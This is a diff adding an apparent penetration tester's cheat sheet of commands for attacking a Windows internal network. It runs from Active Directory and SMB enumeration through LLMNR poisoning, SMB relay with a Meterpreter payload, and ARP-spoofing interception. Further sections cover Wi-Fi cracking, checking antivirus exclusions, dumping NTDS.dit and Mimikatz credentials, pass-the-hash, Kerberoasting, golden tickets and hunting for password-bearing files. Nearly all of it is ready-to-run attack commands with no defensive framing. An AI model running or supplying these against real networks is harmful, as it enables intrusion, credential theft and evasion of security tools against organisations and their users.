@@ -1,0 +1,443 @@
+# List of scripts to run to gather info on an internal network
+
+# Can you ping IPv6 out?
+sudo ping6 -c 3 ipv6.he.net
+sudo traceroute6 -6 ipv6.he.net
+
+# Duh
+nslookup <domain name>
+
+# ARP scan local subnet
+sudo arp-scan -v -l
+
+# Cisco CDP discover
+sudo cdpr -d eth0 -vv
+
+
+------------------------------------- WINDOWS Specific commands ----------------------------------------------------
+# AD controller lookup
+nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain name>
+ping <domain name>  (Usually the DNS server or corp.com)
+
+# Dump all AD objects (plan on drinking a lot of coffee)
+dsquery * -s <DC IP> -u <username> -p <password> -limit 0 > DomainCN.txt
+
+# Dump all server names
+dsquery computer OU=Servers,DC=bv,DC=corp -s <DC IP> -u <username> -p <password> -limit 0
+
+# Dump 
+DsQuery Server -Forest 
+
+# List all domains and workgroups in the network
+NET VIEW /DOMAIN
+
+# List all computers in the network
+NET VIEW
+
+#Show AD server, in Windows only
+C:\> echo %LOGONSERVER%
+C:\> ping %LOGONSERVER%
+ipconfig /all (look for DNS server)
+
+# Dump windows cmd.exe history
+doskey /history
+
+# Powershell commands for dumping email addresses (run on a DC only).
+# Requires PS command "import-module activedirectory"
+# Requires PS command "import-module servermanager" (server only)
+# Requires PS command "Add-WindowsFeature -Name "RSAT-AD-PowerShell" -IncludeAllSubFeature (server only)
+
+# Collect all AD email addresses
+Get-ADUser -Filter * -Properties DisplayName, EmailAddress, Title | select DisplayName, EmailAddress, Title | Export-CSV "E:\temp\EAddresses.csv"
+
+# Find the primary domain controller
+NETDOM QUERY /D:mydomain.com FSMO
+
+# List all member servers & workstations
+NETDOM QUERY /D:MyDomain SERVER
+NETDOM QUERY /D:MyDomain WORKSTATIONS
+
+# List all local administrators
+NET LOCALGROUP Administrators
+
+# Who is logged on to a computer?
+NBTSTAT -a remotecomputer | FIND "<03>" | FIND /I /V "remotecomputer"
+
+# List DN of all users
+dsquery user -s <DC IP> -u <username> -p <password> -limit 0 | dsget user -dn >C:\getalluserdn.txt
+
+# List all DC's in forest with DN and RDN
+DsQuery Server -Forest -s <DC IP> -u <username> -p <password>
+
+# Dump all users  associated attributes
+csvde -m -b <username domain password> -f c:users.csv
+
+# Powershell dump AD users' properties
+import-module ActiveDirectory
+get-aduser -Properties * -Credential domain\username -Server 10.1.1.10 > properties.txt
+
+# Windows get remote usernames 
+wmic /node:10.1.1.70 ComputerSystem Get UserName
+
+# Linux null session
+rpcclient -U "" 192.168.17.245
+
+--------------------------------------------------------------------------------------------------------------------
+
+# Dump lots of good DNS info. Forward
+dnsrecon -d <domain name> -w > dnsrecon.txt
+
+# Get the DNS reverse lookup on IPs. Reverse
+dnsrecon -r 66.249.92.100-66.249.92.150
+
+# Passively detect IPv6 addresses.
+sudo /home/timmy/Applications/Network/pkg-thc-ipv6/passive_discovery6 -Ds eth1 > ipv6detect.txt
+sudo /home/timmy/Applications/Network/pkg-thc-ipv6/implementation6 -p eth0 fe80::5cec:b948:c751:66af
+
+# Not so passive IPv4 detect **** Loud ARP **** Will map network. Don't use "-f" switch.
+sudo /usr/sbin/netdiscover -l ARPscanIP.txt 
+
+# Netbios scan info and sorted. Do not use /8 as it will create a shit storm of ARP. May break remote links.
+nbtscan -s : 10.0.0.0/8 > nbs10.txt
+
+# Will show what domain the computer is in
+nmblookup -A <DNS or IP>
+
+# Error returning browse list: NT_STATUS_ACCESS_DENIED means no Null Sessions. Broken?
+smbclient -I <192.168.1.31> -L MONKEY -N -U ""
+
+
+# Windows mount NFS share
+mount [–o Options] ComputerName:\ShareName {DeviceName | *} 
+ mount -t cifs //192.168.101.100/sales /mnt/cifs -o username=shareuser,password=sharepassword,domain=nixcraft
+
+--------------------------------------------------------------------------------------------------------------------
+
+# Enumerate AD/Local shares, users, machines, security policy and groups.
+# User the username/password is null session is not available. Remove user and pass for null session.
+~/Applications/perl enum4linux.pl -a -u <domain\\username> -p <password> 10.10.10.10 > 10.10.10.10Enum.txt (use \ to escape characters)
+
+--------------------------------------------------------------------------------------------------------------------
+
+# MSF Enum shares
+msf > use auxiliary/scanner/smb/smb_enumshares
+set RHOSTS 192.168.1.150-165
+set THREADS 16
+# optional
+set SMBPass s3cr3t
+set SMBUser Administrator
+run
+
+--------------------------------------------------------------------------------------------------------------------
+
+# LLMNR/NBT Poison/Responder/Relay
+# sudo ~/Application/Responder/Responder.py -i <attacker IP> -v -f -b 1 -r -w --lm
+sudo ruby zackattack.rb 
+
+sudo ./Responder.py -I eth0 -vrfw --lm 
+
+
+
+
+
+sudo proxychains smbclient -U <domain>/<username>%unknownpassword //<target IP>/C$
+
+sudo msfconsole
+db_connect  -y /opt/metasploit/apps/pro/ui/config/database.yml
+use exploit/windows/smb/smb_relay
+set PAYLOAD windows/meterpreter/bind_tcp
+set SMBHOST <target IP>
+exploit
+
+
+
+****************************
+msf > use auxiliary/spoof/nbns/nbns_response
+msf auxiliary(nbns_response) > show options
+msf auxiliary(nbns_response) > set INTERFACE eth0
+msf auxiliary(nbns_response) > set SPOOFIP 10.10.10.10
+run
+
+msf > use auxiliary/server/capture/smb
+msf auxiliary(smb) > show options
+msf auxiliary(smb) > set CHALLENGE 1223344556677889
+msf auxiliary(smb) > set JOHNPWFILE /tmp/john_smb
+run
+msf auxiliary(smb) > use auxiliary/server/capture/http_ntlm
+msf auxiliary(http_ntlm) > show options
+msf auxiliary(smb) > set JOHNPWFILE /tmp/john_http
+msf auxiliary(smb) > set SRVPORT 80
+msf auxiliary(smb) > set URIPATH /
+run
+
+
+sudo sqlmap -r /opt/PWK/Files/252/POST.txt -p "period_id" --os-pwn --threads=5 --dbms=mysql --msf-path=/opt/metasploit/apps/pro/msf3/
+
+--------------------------------------------------------------------------------------------------------------------
+
+# Winexe
+winexe -U <domain>/<username> --uninstall --system -W <domain> //<IP> cmd.exe
+
+--------------------------------------------------------------------------------------------------------------------
+
+# VNC Viewer
+vncviewer -via tim.vancleave@10.0.8.17 localhost:2
+
+--------------------------------------------------------------------------------------------------------------------
+
+#Setup IPTables for wifi forwarding
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports <$listenPort>
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports <$httpListenPort>
+
+# Intercept
+arpspoof -i eth0 -t <Target IP> <Gateway>
+Authority Mode: sslsniff -a -s <$listenPort> -w <$logFile> -c <$caCert>
+Targeted Mode:sslsniff -t -s <$listenPort> -w <$logFile> -m IPSCACLASEA1.crt \ -c <$certDir>
+
+# Autocrack - WEP only. Use Aireplay ARP to boost speed. Done in 3 min.
+autocrack4.4.sh
+airodump-ng mon0
+aireplay-ng -b <bssid> -e <essid> -3 mon0
+
+#Enterprise Crack
+# http://phreaklets.blogspot.com/2013/06/cracking-wireless-networks-protected.html
+radiusd -X
+tail -f /usr/local/var/log/radius/freeradius-server-wpe.log
+hostapd --dd hostapd-wpe.conf
+
+airodump-ng --channel <#> mon0
+# or 
+wifite -b <bssid> -e <essid> -c <channel #> -wpa -dict /usr/share/wordlists/rockyouSort.txt -pyrit
+
+# WPA Crack
+crunch 8 10 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWX YZ0123456789\!\@\#\$\%\&\*\- | aircrack-ng --bssid <aa:aa:aa:aa:aa:aa> -w- <handshakefile.cap>
+
+
+--------------------------------------------------------------------------------------------------------------------
+
+# Create custom wordlists
+crunch  15 15 -t conference_@@@@ >> Wordlist.txt
+# Or 
+crunch 8 10 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWX YZ0123456789\!\@\#\$\%\&\*\- | pyrit -r xxx.cap -b xx:xx:xx:xx:xx:xx -i - attack_passthrough
+
+--------------------------------------------------------------------------------------------------------------------
+
+# Increase power level for wifi
+iwconfig wlan2 txpower 30
+
+--------------------------------------------------------------------------------------------------------------------
+
+# List remote windows services
+C:\> PsExec.exe \\<IP> -u <domain>\<user> -p <password> net start
+
+--------------------------------------------------------------------------------------------------------------------
+
+################ EASY WIN ################
+
+# GPO cpassword
+smbclient -W <domain> -U <username> \\\\<DC IP>\\SYSVOL
+
+smb:\> cd <tab>
+smb:\> recurse
+smb:\> prompt off 
+smb:\> mget Policies 
+smb:\> mget scripts 
+
+grep -ri administrator .
+grep -ri cpassword .
+--------------------------------------------------------------------------------------------------------------------
+
+#ARP Poison. Unified scan. Scan for hosts. Host list. Add hosts 1 & 2. Set sniff remote conn. Start sniffing.
+ettercap -G
+
+--------------------------------------------------------------------------------------------------------------------
+
+#Port scan
+#Quick
+nmap -vv -Pn -T4 -iL <inputFile.txt> -oX nmapQuick-<company>.xml
+
+--------------------------------------------------------------------------------------------------------------------
+
+#Service detect - long
+nmap -vv -Pn --version-all -T4 -iL <inputFile.txt> -oX nmapService-<company>.xml
+
+--------------------------------------------------------------------------------------------------------------------
+
+# Walk all SNMP MIBs.
+snmpwalk -v1 -c public 10.10.6.61 > 10.10.6.61snmp.txt
+braa
+snmpcheck -c public <IP>
+
+--------------------------------------------------------------------------------------------------------------------
+
+# Search for a service running as domain admin on a server. List IPs to search in ips.txt and domain admin names in names.txt
+
+FOR /F %i in (ips.txt) DO @echo [+] %i && @tasklist /V /S %i /U user /P password 2>NUL > output.txt && FOR /F %n in (names.txt) DO @type output.txt | findstr %n > NUL && echo [!] %n was found running a process on %i && pause
+
+--------------------------------------------------------------------------------------------------------------------
+
+*******************************************
+# Recover AD and local Hashses remotely
+# Use smbexec to build host list then dump hashes from host
+smbexec
+
+# Merge cleartext password files into one file.
+find . -name memory | xargs /bin/cat > merged.txt
+*******************************************
+
+# Detect McAfee exclusions
+psexec \\<target IP> -u <username> -p <password> reg query "HKLM\Software\Wow6432Node\McAfee\SystemCore\vscore\On Access Scanner\McShield"
+
+# 32bit
+psexec \\<target IP> -u <username> -p <password> reg query  "HKLM\SOFTWARE\Symantec\Symantec Endpoint Protection\AV\Exclusions\ScanningEngines\Extensions"
+
+# 64bit
+psexec \\<target IP> -u <username> -p <password> reg query "HKLM\Software\WOW6432Node\Symantec\Symantec Endpoint Protection\AV\Exclusions\ScanningEngines\FileName\Admin"
+
+# Windows Defender
+psexec \\<target IP> -u <username> -p <password> reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
+psexec \\<target IP> -u <username> -p <password> reg query HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions"
+psexec \\<target IP> -u <username> -p <password> reg query HKLM/\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes"
+
+
+# Detect Symantec AV exclusions
+HKLM\Symantec\Symantec Endpoint Protection\AV\Exclusions\ScanningEngines\Directory
+HKLM\SOFTWARE\Symantec\Symantec Endpoint Protection\AV\Exclusions\ScanningEngines\FileName
+HKLM\SOFTWARE\Symantec\Symantec Endpoint Protection\AV\Exclusions\ScanningEngines\Extensions\
+
+# Symantec also excludes it own Embedded Database from Scanning
+
+HKLM\SOFTWARE\Symantec\Symantec Endpoint Protection\AV\Exclusions\Symantec Embedded Database\FileExceptions
+Out.log, Sem5.log and Sem5.db are excluded
+
+
+# The manual way of dumping SAM from a DC.
+# Create Shadow Copy 
+vssadmin create shadow /For=c:
+
+# Remotely
+psexec \\<target IP> -u <username> -p <password> vssadmin create shadow /For=c:
+
+# Verify Shadow Copy (should have current date)
+vssadmin list shadows
+
+# Remotely
+psexec \\<target IP> -u <username> -p <password>  vssadmin list shadows
+
+
+# Dump password history
+esedbexport ntds.dit   ## Creates a ntds.dit.export directory in the directory the command is executed
+
+# Use dsdump.py to dump the hashes from the datatable using the bootkey from the SYSTEM hive.
+# python ./dsdump.py ../SYSTEM ../libesedb/esedbtools/ntds.dit.export/datatable
+~/Applications/ntdsxtract$ python ~/Applications/Windows/SMB/ntdsextract/dsusers.py ntds.dit.export/datatable.2  ntds.dit.export/link_table.3 TEMP --passwordhashes --passwordhistory --lmoutfile LM.out --ntoutfile NT.out --pwdformat ophc --syshive SYSTEM
+
+--------------------------------------------------------------------------------------------------------------------
+
+# RID Enum
+/Applications/ridenum/python rid_enum.py <DC IP>
+
+# Bruteforce a user account using 1 or 2 common passwords using the list of accts found from ridenum.
+# Sync time to DC
+rdate -n <DC IP>
+
+# connect to DC with normal user acct
+rpcclient -U <username> <DC IP>
+
+# Get SID of user acct
+rpcclient $> lookupnames <username>
+
+# List services remotely
+PsExec.exe \\<IP> -u <domain>\<user> -p <password> net start
+
+--------------------------------------------------------------------------------------------------------------------
+Password Dumping
+--------------------------------------------------------------------------------------------------------------------
+# Dump plain text passwords
+wce -w
+
+# Mimikatz
+mimikatz privilege::debug "sekurlsa::logonPasswords full"
+
+# Mimikatz PTH - only works locally
+privilege::debug
+sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTLM hash>
+
+
+#### Kerberos Attacks (IdentityModel needs to be added before running the other commands.) ########
+
+# Find Service Accounts
+
+PS C:\> klist 
+PS C:\> klist purge
+PS C:\> setspn.exe -T OWL -F -Q */* > spn.txt
+
+# OR
+
+PS C:\> setspn.exe -T OWL -Q */* | Select-String '^CN' -Context 0,1 | % {New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() } > spn1.txt
+
+
+
+# Request Ticket
+PS C:\>Add-Type -AssemblyName System.IdentityModel
+PS C:\>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<service name>\<server.domain>"
+
+C:\> mimikatz
+
+mimikatz # kerberos::list /export
+
+PS C:\Users\tim.vancleave.OWL\Desktop\Tools\SMB\mimikatz\x64> C:\Python27\python.exe .\tgsrepcrack.py .\rockyou.txt '.\*.kirbi'
+
+
+
+C:\>mimikatz
+
+mimikatz # kerberos::golden
+	/domain:<domain name>
+	/sid: <SID>
+	/groups:512,513,520,518,519
+	/target:<hostname:port>
+	/service:<service name>
+	/ticket:<.kirbi>
+	/rc4:<service's hash>
+	/ptt
+	/id:<any input can go here, 1111, <script>>
+	/user:<username>
+
+mimikatz64.exe "sekurlsa::logonPasswords full" > passwords.txt
+
+--------------------------------------------------------------------------------------------------------------------
+# NMAP PtH
+
+nmap -p U:137,T:139 –script-args ‘smbuser=mike,smbhash=8846f7eaee8fb117ad06bdd830b7586c’ –script=smb-enum-groups –script=smb-enum-users 192.168.52.151
+
+--------------------------------------------------------------------------------------------------------------------
+
+# Powershell Profiles
+%windir%\system32\WindowsPowerShell\1.0\profile.ps1 (applies to all users and shells)
+
+%windir%\system32\WindowsPowerShell\1.0\Microsoft.PowerShell_profile.ps1 (applies to all users but only Microsoft.PowerShell shell)
+
+%UserProfile\My Documents\WindowsPowerShell\profile.ps1 (Applies to current user, all shells)
+
+
+--------------------------------------------------------------------------------------------------------------------
+# Extensions to look for
+
+.ica
+.ora
+.bat
+.ps1
+.txt
+.sql
+.rdp
+
+# Golden files!!!!
+
+c:\sysprep.inf
+c:\sysprep\sysprep.xml
+%WINDIR%\Panther\Unattend\Unattended.xml
+%WINDIR%\Panther\Unattended.xml
+
